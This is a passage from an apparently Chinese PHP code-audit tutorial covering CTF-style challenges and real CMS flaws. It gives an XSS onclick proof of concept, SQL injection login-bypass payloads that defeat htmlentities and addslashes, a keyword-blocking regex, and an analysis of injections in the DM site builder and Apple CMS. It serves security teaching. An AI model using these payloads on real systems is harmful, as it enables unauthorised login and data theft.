htmlentities()。</p></blockquote><p>注：<strong>htmlentities()</strong> 并不能转换所有的特殊字符，是转换除了空格之外的特殊字符，且单引号和双引号需要单独控制（通过第二个参数）。第2个参数取值有3种，分别如下：</p><ul><li>ENT_COMPAT（默认值）：只转换双引号。</li><li>ENT_QUOTES：两种引号都转换。</li><li>ENT_NOQUOTES：两种引号都不转换。</li></ul><p>这里附上一个 <a href="http://www.w3school.com.cn/html/html_entities.asp">HTML 中有用的字符实体表</a> </p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image.png"></p><p>经过上面的分析，我们再回到题目，想想如何构造一下攻击 <strong>payload</strong> 。我们先梳理一些已知信息：</p><ul><li>这里的 <strong>$query</strong> 参数可控</li><li>且 <strong>htmlentities</strong> 函数在这里可逃逸单引号</li><li>xss的漏洞触发点在 <code>&lt;a&gt;</code> 标签。</li></ul><p>在 <code>&lt;a&gt;</code> 中，我们可以通过 <strong>javascript</strong> 事件来执行js代码，例如： <strong>onclick</strong> 这类事件，因此最后的poc构造如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?a&#x27;onclick%3dalert(1)%2f%2f=c</span><br></pre></td></tr></table></figure><h3 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h3><p>本次实例分析选择 <a href="http://sqdownb.onlinedown.net/down/1510917608_44072_ym.rar">DM企业建站系统 v201710</a> 中的 <strong>sql注入漏洞</strong> 来进行分析。首先，我们可以从cnvd上面看到一些相关信息，如下：</p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-1.png"></p><p>从漏洞通告中可以发现一些有用的信息，漏洞位置在登陆处，搭建的时候提示后台登陆口位置在 <strong>admindm-yourname&#x2F;g.php</strong> 文件中，打开这个文件，发现重定向到 <strong>admindm-yournamemod_common&#x2F;login.php</strong> 文件中，所以漏洞触发点应该就在这个文件中。</p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-2.png"></p><p>打开 <strong>admindm-yournamemod_common&#x2F;login.php</strong> 这个文件，一眼就看到漏洞位置，截取部分相关代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$act</span>==<span class="string">&#x27;login&#x27;</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$user</span>= <span class="title function_ invoke__">htmlentitiesdm</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]));</span><br><span class="line">    <span class="variable">$ps</span>= <span class="title function_ invoke__">htmlentitiesdm</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$user</span>)&lt;<span class="number">2</span> <span class="keyword">or</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$ps</span>)&lt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">alert</span>(<span class="string">&#x27;字符不够 sorry,user need more long&#x27;</span>); <span class="title function_ invoke__">jump</span>(<span class="variable">$jumpv</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">require_once</span> WEB_ROOT.<span class="string">&#x27;component/dm-config/mysql.php&#x27;</span>;</span><br><span class="line">    <span class="comment">// $salt = &#x27;00&#x27;; is in config.php</span></span><br><span class="line">    <span class="variable">$pscrypt</span>= <span class="title function_ invoke__">crypt</span>(<span class="variable">$ps</span>, <span class="variable">$salt</span>);</span><br><span class="line">    <span class="comment">//echo $pscrypt;</span></span><br><span class="line">    <span class="variable">$ss_P</span>=<span class="string">&quot;select * from &quot;</span>.TABLE_USER.<span class="string">&quot; where email=&#x27;<span class="subst">$user</span>&#x27; and ps=&#x27;<span class="subst">$pscrypt</span>&#x27; order by id desc limit 1&quot;</span>;</span><br><span class="line">    <span class="comment">// echo $ss_P;exit;</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">getnum</span>(<span class="variable">$ss_P</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable">$row</span>=<span class="title function_ invoke__">getrow</span>(<span class="variable">$ss_P</span>);</span><br><span class="line">            <span class="variable">$userid</span>=<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <strong>第15行</strong> 很明显存在sql注入漏洞，通过拼接的方式直接插入到select语句中。 <strong>第15行</strong> 中的 <strong>$user</strong> 变量是通过 <strong>POST</strong> 方式提交上来，其值可控。但是上图的 <strong>第3行</strong> 代码调用 <strong>htmlentitiesdm</strong> 函数，对 <strong>POST</strong> 数据进行了处理，我们跟进这个 <strong>htmlentitiesdm</strong> 函数。该函数位置在 <strong>component&#x2F;dm-config&#x2F;global.common.php</strong> 文件中，截取关键代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">htmlentitiesdm</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">htmlentities</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$v</span>),ENT_NOQUOTES,<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数是调用 <strong>htmlentities</strong> 函数针对输入的数据进行处理。前面我们已经介绍过了这个函数的用法，这里这个函数的可选参数是 <strong>ENT_NOQUOTES</strong> ，也就是说两种引号都不转换。下面我们来看个小例子：</p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-5.png"></p><p>这里我猜测开发者应该是考虑到了xss的问题，但是由于 <strong>htmlentities</strong> 这个函数选择的参数出现了偏差，导致这里我们可以引入单引号造成注入的问题。</p><p>我们看看最新版是怎么修复，使用 <strong>beyond compare</strong> 对比两个版本代码的差别。</p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-3.png"></p><p>新版修复的时候将可选参数修改为 <strong>ENT_QUOTES</strong> ，这个参数的作用就是过滤单引号加双引号，我们来看看下面这个例子，就很容易明白了这个参数的作用了。<br><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-4.png"></p><h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>这里因为没有回显，所以是盲注，下面是验证截图：</p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-6.png"></p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>针对 <strong>htmlentities</strong> 这个函数，我们建议大家在使用的时候，尽量加上可选参数，并且选择 <strong>ENT_QUOTES</strong> 参数。</p><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;db.inc.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;username&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/(?:\w*)\W*?[a-z].*(R|ELECT|OIN|NTO|HERE|NION)/i&quot;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;username&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Attack detected!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/(?:\w*)\W*?[a-z].*(R|ELECT|OIN|NTO|HERE|NION)/i&quot;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Attack detected!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">get_magic_quotes_gpc</span>())&#123;</span><br><span class="line">        <span class="variable">$str</span>=<span class="title function_ invoke__">stripslashes</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$str</span>, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = @<span class="title function_ invoke__">clean</span>((<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line"><span class="variable">$password</span> = @<span class="title function_ invoke__">clean</span>((<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span>=<span class="string">&#x27;SELECT * FROM ctf.users WHERE name=\&#x27;&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;\&#x27; AND pass=\&#x27;&#x27;</span>.<span class="variable">$password</span>.<span class="string">&#x27;\&#x27;;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#echo $query;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$query</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;&quot;</span> . <span class="variable">$row</span>[<span class="string">&#x27;name&#x27;</span>] . <span class="string">&quot;&lt;/td&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/tr&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$mysql_server_name</span>=<span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$mysql_database</span>=<span class="string">&quot;Day12&quot;</span>;    <span class="comment">/** 数据库的名称 */</span></span><br><span class="line"><span class="variable">$mysql_username</span>=<span class="string">&quot;Hongri&quot;</span>;  <span class="comment">/** MySQL数据库用户名 */</span></span><br><span class="line"><span class="variable">$mysql_password</span>=<span class="string">&quot;Hongri&quot;</span>;  <span class="comment">/** MySQL数据库密码 */</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysql_connect</span>(<span class="variable">$mysql_server_name</span>, <span class="variable">$mysql_username</span>,<span class="variable">$mysql_password</span>,<span class="string">&#x27;utf-8&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>从代码 <strong>第27行</strong> 很明显，这道题考查sql注入，但是这里有两个考察点，我们分别来看一下。</p><h3 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h3><p> <strong>第23行</strong> 和 <strong>第24行</strong> 针对 <strong>GET</strong> 方式获取到的 <strong>username</strong> 和 <strong>password</strong> 进行了处理，处理函数为 <strong>clean</strong> 。该函数在 <strong>第16-20行</strong> 处定义，函数的主要功能就是使用 <strong>htmlentities</strong> 函数处理变量中带有的特殊字符，而这里加入了 <strong>htmlentities</strong> 函数的可选参数 <strong>ENT_QUOTES</strong> ，因此这里会对 <strong>单引号</strong> ， <strong>双引号</strong> 等特殊字符进行转义处理。由于这里的注入是字符型的，需要闭合单引号或者逃逸单引号，因此这里需要绕过这个函数。我们可以通过下面这个例子观察 <strong>clean</strong> 函数的处理效果：</p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-7.png"></p><p>题目 <strong>第36行</strong> 是进入数据库查询，并且返回 <strong>name</strong> 列字段的值。而这里的sql语句是这样的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span>=<span class="string">&#x27;SELECT * FROM ctf.users WHERE name=\&#x27;&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;\&#x27; </span></span><br><span class="line"><span class="string">AND pass=\&#x27;&#x27;</span>.<span class="variable">$password</span>.<span class="string">&#x27;\&#x27;;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>那我们如果输入的 <strong>username</strong> 是 <strong>admin</strong> ， <strong>password</strong> 是 <strong>admin</strong> ，自然就构成了正常要执行的sql语句。</p><p>这道题的问题就在于可以引入反斜杠，也就是转义符，官方针对 <a href="http://php.net/manual/zh/regexp.reference.escape.php">转义符</a> 是这么解释的。</p><blockquote><p>比如，如果你希望匹配一个 “*” 字符，就需要在模式中写为 <code>\*</code>。 这适用于一个字符在不进行转义会有特殊含义的情况下。</p></blockquote><p>这里我们看个简单的例子理解一下这个转义符号。</p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-8.png"></p><p>转义符号会让当前的特殊符号失去它的作用，这道题由于可以引入反斜杠，也就是转义符号，来让</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span>=<span class="string">&#x27;SELECT * FROM ctf.users WHERE name=\&#x27;&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;\&#x27; </span></span><br><span class="line"><span class="string">AND pass=\&#x27;&#x27;</span>.<span class="variable">$password</span>.<span class="string">&#x27;\&#x27;;&#x27;</span>;</span><br></pre></td></tr></table></figure><p><strong>username</strong>后面的 <strong>‘</strong> 失效，只要这个 <strong>‘</strong> 失效，就能闭合**pass&#x3D;**后面的 **’**。最后组合的payload就如下图所示</p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-9.png"></p><p>所以实际上目前 <strong>name</strong> 的值是 <strong>admin\‘ AND pass&#x3D;</strong> ,这时候 <strong>password</strong> 的值是一个可控的输入点，我们可以通过这个值来构造 <strong>sql</strong> 的 <strong>联合查询</strong> ，并且注释掉最后的 <strong>单引号</strong> 。</p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-10.png"></p><p>第一部分我们其实已经成功构造好了payload，但是回头来看看题目，题目 <strong>第6行</strong> 到 <strong>第16行</strong> 有两个正则表达式，作用就是如果参数中带有 <strong>or、and 、union</strong> 等数据，就退出，并输出 <strong>Attack detected!!!</strong> </p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-11.png"></p><p>这里当然我们可以正面硬刚这个正则表达式。但是这里我们来聊一个比较有趣的解法。</p><p>我们看到是通过 <strong>request</strong> 方式传入数据，而php中 <a href="http://php.net/manual/zh/reserved.variables.request.php">REQUEST</a> 变量默认情况下包含了 <strong>GET</strong> ，<strong>POST</strong> 和 <strong>COOKIE</strong> 的数组。在 <strong>php.ini</strong> 配置文件中，有一个参数 <strong>variables_order</strong> ，这参数有以下可选项目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">; variables_order</span><br><span class="line">;   Default Value: &quot;EGPCS&quot;</span><br><span class="line">;   Development Value: &quot;GPCS&quot;</span><br><span class="line">;   Production Value: &quot;GPCS&quot;</span><br></pre></td></tr></table></figure><p>这些字母分别对应的是 <strong>E: Environment</strong> ，<strong>G:Get</strong>，<strong>P:Post</strong>，<strong>C:Cookie</strong>，<strong>S:Server</strong>。这些字母的出现顺序，表明了数据的加载顺序。而 <strong>php.ini</strong> 中这个参数默认的配置是 <strong>GPCS</strong> ，也就是说如果以 <strong>POST</strong> 、 <strong>GET</strong> 方式传入相同的变量，那么用 <strong>REQUEST</strong> 获取该变量的值将为 <strong>POST</strong> 该变量的值。<br>我们举个简单的例子方便大家理解：</p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-12.png"></p><p>我们可以看到这里的 <strong>post</strong> 方式传入的数据覆盖了 <strong>get</strong> 方式传入的数据，因此这里最后的payload如下：</p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-13.png"></p><p>参考文章<br><a href="https://github.com/CHYbeta/Code-Audit-Challenges/blob/master/php/challenge-50.md">Code-Audit-Challenges</a></p><h2 id="Day-13-Turkey-Baster"><a href="#Day-13-Turkey-Baster" class="headerlink" title="Day 13 - Turkey Baster"></a>Day 13 - Turkey Baster</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoginManager</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$em</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;em = <span class="title class_">DoctrineManager</span>::<span class="title function_ invoke__">getEntityManager</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user = <span class="variable">$user</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValid</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">sanitizeInput</span>(<span class="variable">$this</span>-&gt;user);</span><br><span class="line">        <span class="variable">$pass</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">sanitizeInput</span>(<span class="variable">$this</span>-&gt;password);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$queryBuilder</span> = <span class="variable language_">$this</span>-&gt;em-&gt;<span class="title function_ invoke__">createQueryBuilder</span>()</span><br><span class="line">            -&gt;<span class="title function_ invoke__">select</span>(<span class="string">&quot;COUNT(p)&quot;</span>)</span><br><span class="line">            -&gt;<span class="keyword">from</span>(<span class="string">&quot;User&quot;</span>, <span class="string">&quot;u&quot;</span>)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">where</span>(<span class="string">&quot;user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;&quot;</span>);</span><br><span class="line">        <span class="variable">$query</span> = <span class="variable">$queryBuilder</span>-&gt;<span class="title function_ invoke__">getQuery</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">boolval</span>(<span class="variable">$query</span>-&gt;<span class="title function_ invoke__">getSingleScalarResult</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizeInput</span>(<span class="params"><span class="variable">$input</span>, <span class="variable">$length</span> = <span class="number">20</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$input</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$input</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$input</span>) &gt; <span class="variable">$length</span>) &#123;</span><br><span class="line">            <span class="variable">$input</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$input</span>, <span class="number">0</span>, <span class="variable">$length</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$input</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$auth</span> = <span class="keyword">new</span> <span class="title class_">LoginManager</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$auth</span>-&gt;<span class="title function_ invoke__">isValid</span>()) &#123;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是一道典型的用户登录程序，从代码来看，考察的应该是通过 <strong>SQL注入</strong> 绕过登陆验证。代码 <strong>第33行</strong> ，通过 <strong>POST</strong> 方式传入 <strong>user</strong> 和 <strong>passwd</strong> 两个参数，通过 <strong>isValid()</strong> 来判断登陆是否合法。我们跟进一下 <strong>isValid()</strong> 这个函数，该函数主要功能代码在 <strong>第12行-第22行</strong> ，我们看到 <strong>13行</strong> 和 <strong>14行</strong> 调用 <strong>sanitizeInput()</strong> 针对 <strong>user</strong> 和 <strong>password</strong> 进行相关处理。</p><p>跟进一下 <strong>sanitizeInput()</strong> ，主要功能代码在 <strong>第24行-第29行</strong> ，这里针对输入的数据调用 <strong>addslashes</strong> 函数进行处理，然后再针对处理后的内容进行长度的判断，如果长度大于20，就只截取前20个字符。 <strong>addslashes</strong> 函数定义如下：</p><blockquote><p><a href="http://php.net/manual/zh/function.addslashes.php">addslashes</a> — 使用反斜线引用字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">addslashes</span> ( <span class="keyword">string</span> <span class="variable">$str</span> )</span><br></pre></td></tr></table></figure><p>作用：在单引号（’）、双引号（”）、反斜线（\）与 NUL（ <strong>NULL</strong> 字符）字符之前加上反斜线。</p></blockquote><p>我们来看个例子：<br><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-14.png"></p><p>那这题已经过滤了单引号，正常情况下是没有注入了，那为什么还能导致注入了，原因实际上出在了 <strong>substr</strong> 函数，我们先看这个函数的定义：</p><blockquote><p><a href="http://php.net/manual/zh/function.substr.php">substr</a> — 返回字符串的子串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">substr</span> ( <span class="keyword">string</span> <span class="variable">$string</span> , <span class="keyword">int</span> <span class="variable">$start</span> [, <span class="keyword">int</span> <span class="variable">$length</span> ] )</span><br></pre></td></tr></table></figure><p>作用：返回字符串 <code>string</code> 由 <code>start</code> 和 <code>length</code> 参数指定的子字符串。 </p></blockquote><p>我们来看个例子：</p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-15.png"></p><p>那么再回到这里，我们知道反斜杠可以取消特殊字符的用法，而注入想要通过单引号闭合，在这道题里势必会引入反斜杠。所以我们能否在反斜杠与单引号之间截断掉，只留一个反斜杠呢？答案是可以，我们看个以下这个例子。</p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-16.png"></p><p>在这个例子中，我们直接使用题目代码中的过滤代码，并且成功在反斜杠和单引号之间截断了，那我们把这个payload带入到题目代码中，拼接一下 <strong>第17行-第19行</strong> 代码中的sql语句。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="title function_ invoke__">count</span>(p) <span class="keyword">from</span> user u where user = <span class="string">&#x27;1234567890123456789\&#x27; AND password = &#x27;</span><span class="variable">$pass</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>这里的sql语句由于反斜杠的原因， <strong>user &#x3D; ‘1234567890123456789\‘</strong> 最后这个单引号便失去了它的作用。这里我们让 <strong>pass&#x3D;or 1&#x3D;1#</strong> ，那么最后的sql语句如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="title function_ invoke__">count</span>(p) <span class="keyword">from</span> user where user = <span class="string">&#x27;1234567890123456789\&#x27; AND password = &#x27;</span><span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#&#x27;</span></span><br></pre></td></tr></table></figure><p>这时候在此SQL语句中， <strong>user</strong> 值为 <strong>1234567890123456789\‘ AND password &#x3D;</strong>  ，因此我们可以保证带入数据库执行的结果为 <strong>True</strong> ，然后就能够顺利地通过验证。</p><p>所以这题最后的 <strong>payload</strong> 如下所示：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=<span class="number">1234567890123456789</span><span class="string">&#x27;&amp;passwd=or 1=1#</span></span><br></pre></td></tr></table></figure><h3 id="实例分析-1"><a href="#实例分析-1" class="headerlink" title="实例分析"></a>实例分析</h3><p>这里的实例分析，我们选择 <strong>苹果CMS视频分享程序 8.0</strong> 进行相关漏洞分析。漏洞的位置是在 <strong>inc\common\template.php</strong> ，我们先看看相关代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$lp</span>[<span class="string">&#x27;wd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$where</span> .= <span class="string">&#x27; AND ( instr(a_name,\&#x27;&#x27;</span>.<span class="variable">$lp</span>[<span class="string">&#x27;wd&#x27;</span>].<span class="string">&#x27;\&#x27;)&gt;0 or instr(a_subname,\&#x27;&#x27;</span>.<span class="variable">$lp</span>[<span class="string">&#x27;wd&#x27;</span>].<span class="string">&#x27;\&#x27;)&gt;0 ) &#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里代码的 <strong>第三行-第四行</strong> 位置， <strong>$lp[‘wd’]</strong> 变量位置存在字符串拼接，很明显存在 <strong>sql注入</strong> ，但是这个cms具有一些通用的注入防护，所以我们从头开始一步步的看。</p><p>首先在 <strong>inc\module\vod.php</strong> 文件中的，我们看到 <strong>第一行</strong> 代码当 <strong>$method&#x3D;search</strong> 成立的时候，进入了 <strong>第3行</strong> 中的 <strong>be(“all”, “wd”)</strong> 获取请求中 <strong>wd</strong> 参数的值，并且使用 <strong>chkSql()</strong> 函数针对 <strong>wd</strong> 参数的值进行处理。部分关键代码如下所示：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>(<span class="variable">$method</span>==<span 